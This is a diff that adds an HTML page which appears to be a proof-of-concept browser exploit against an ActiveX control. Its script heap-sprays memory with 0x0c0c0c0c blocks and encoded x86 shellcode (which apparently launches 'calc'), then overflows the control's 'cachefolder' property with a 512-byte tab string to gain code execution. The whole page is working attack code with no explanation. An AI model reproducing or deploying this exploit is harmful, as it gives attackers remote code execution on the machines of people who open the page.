@@ -1,0 +1,27 @@
+<html>
+<object classid='clsid:0A5FD7C5-A45C-49FC-ADB5-9952547D5715' id='obj1'></object>
+<script language='javascript'>
+var sc01 = unescape("%u9090%u9090"+ 
+"%ue8fcD%u0000%u458b%u8b3c%u057c%u0178%u8bef%u184f%u5f8b"+
+"%u0120%u49eb%u348b%u018b%u31ee%u99c0%u84ac%u74c0%uc107%u0dca"+
+"%uc201%uf4eb%u543b%u0424%ue575%u5f8b%u0124%u66eb%u0c8b%u8b4b"+
+"%u1c5f%ueb01%u1c8b%u018b%u89eb%u245c%uc304%uc031%u8b64%u3040"+
+"%uc085%u0c78%u408b%u8b0c%u1c70%u8bad%u0868%u09eb%u808b%u00b0"+
+"%u0000%u688b%u5f3c%uf631%u5660%uf889%uc083%u507b%uf068%u048a"+
+"%u685f%ufe98%u0e8a%uff57%u63e7%u6c61c");
+var mainblk = unescape("%u0c0c%u0c0c");
+var hdr = 20;
+var slck = hdr + sc01.length;
+while (mainblk.length < slck) mainblk += mainblk;
+var fillblk = mainblk.substring(0,slck);
+var blk = mainblk.substring(0,mainblk.length - slck);
+while (blk.length + slck < 0x40000) blk = blk + blk + fillblk;
+var memory = new Array();
+for (i = 0; i < 400; i++){ memory[i] = blk + sc01 }
+var buf = '';
+while (buf.length < 512) buf = buf + unescape("%09"); // TAB - 0x09 works best here.
+obj1.cachefolder = buf;
+</script>
+</html>
+
+
